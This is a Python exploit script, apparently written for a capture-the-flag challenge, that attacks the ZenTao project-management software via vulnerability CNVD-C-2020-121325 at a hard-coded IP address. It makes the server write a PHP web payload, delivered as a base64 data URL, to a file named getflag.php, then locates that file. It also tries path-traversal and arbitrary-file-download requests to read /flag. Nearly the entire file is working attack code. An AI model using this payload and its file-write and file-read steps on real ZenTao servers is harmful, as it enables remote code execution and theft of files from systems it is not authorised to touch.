#!/usr/bin/env python3
"""
禅道 CNVD-C-2020-121325 正确利用方式
基于搜索到的信息：使用 mode=getconfig
"""

import requests
import base64

requests.packages.urllib3.disable_warnings()

def exploit_with_getconfig():
    """使用 mode=getconfig 方式利用"""
    base_url = "http://47.113.178.182:32829"

    print("""
╔═══════════════════════════════════════════════════════════════╗
║      禅道 CNVD-C-2020-121325 - 正确利用方式                  ║
╚═══════════════════════════════════════════════════════════════╝
    """)

    # 根据搜索结果，正确的URL格式应该是: /www/index.php?mode=getconfig
    # 但题目URL是 /zentao/，所以尝试两种

    urls_to_try = [
        f"{base_url}/zentao/www/index.php",
        f"{base_url}/zentao/index.php",
        f"{base_url}/www/index.php",
        f"{base_url}/index.php",
    ]

    # PHP payload - 使用文件操作读取 flag
    payload_src = "<?php echo file_get_contents('/flag'); ?>"
    payload_b64 = base64.b64encode(payload_src.encode()).decode()

    # Data URL 格式 (根据用户提供的hint)
    data_url = f"data:text/plain;base64,{payload_b64}"

    print(f"[*] Payload: {payload_src}")
    print(f"[*] Data URL: {data_url}\n")

    filename = "getflag.php"

    for base_index_url in urls_to_try:
        print("=" * 70)
        print(f"[*] 尝试 URL: {base_index_url}")

        # 尝试不同的参数组合
        param_combinations = [
            {"mode": "getconfig", "fileName": filename, "fileUrl": data_url},
            {"m": "client", "f": "save", "t": "txt", "fileName": filename},
            {"m": "client", "f": "download", "fileName": filename, "url": data_url},
        ]

        for params in param_combinations:
            try:
                print(f"\n  [*] 参数: {params}")

                # GET 请求
                resp = requests.get(base_index_url, params=params, timeout=10)
                print(f"      GET 响应: {resp.status_code}")

                if resp.status_code == 200 and len(resp.text) > 0:
                    print(f"      响应内容: {resp.text[:100]}")

                # POST 请求
                resp = requests.post(base_index_url, data=params, timeout=10)
                print(f"      POST 响应: {resp.status_code}")

                # 检查文件是否被创建
                possible_paths = [
                    f"{base_url}/zentao/data/client/1/{filename}",
                    f"{base_url}/data/client/1/{filename}",
                    f"{base_url}/zentao/www/data/client/1/{filename}",
                ]

                for path in possible_paths:
                    check = requests.get(path, timeout=10)
                    if check.status_code == 200 and check.text.strip():
                        print(f"\n      ✓✓✓ 找到文件: {path}")
                        print(f"      内容: {check.text}")

                        if 'flag{' in check.text.lower() or 'ctf{' in check.text.lower():
                            print("\n" + "=" * 70)
                            print("🚩🚩🚩 Flag 获取成功! 🚩🚩🚩")
                            print("=" * 70)
                            return check.text

            except Exception as e:
                print(f"      错误: {str(e)[:50]}")

    return None


def try_direct_file_inclusion():
    """尝试直接文件包含/读取"""
    base_url = "http://47.113.178.182:32829"

    print("\n" + "=" * 70)
    print("尝试其他可能的漏洞点")
    print("=" * 70)

    # 尝试路径遍历读取 flag
    payloads = [
        "/zentao/index.php?f=../../../../flag",
        "/zentao/index.php?file=/flag",
        "/zentao/index.php?m=misc&f=downLoad&file=/flag",
    ]

    for payload in payloads:
        url = base_url + payload
        print(f"\n[*] 测试: {url}")
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200 and len(resp.content) > 0:
                print(f"    响应长度: {len(resp.content)}")
                print(f"    内容: {resp.text[:200]}")
        except Exception as e:
            pass


def main():
    result = exploit_with_getconfig()

    if not result:
        try_direct_file_inclusion()

    print("\n[*] 完成")


if __name__ == "__main__":
    main()
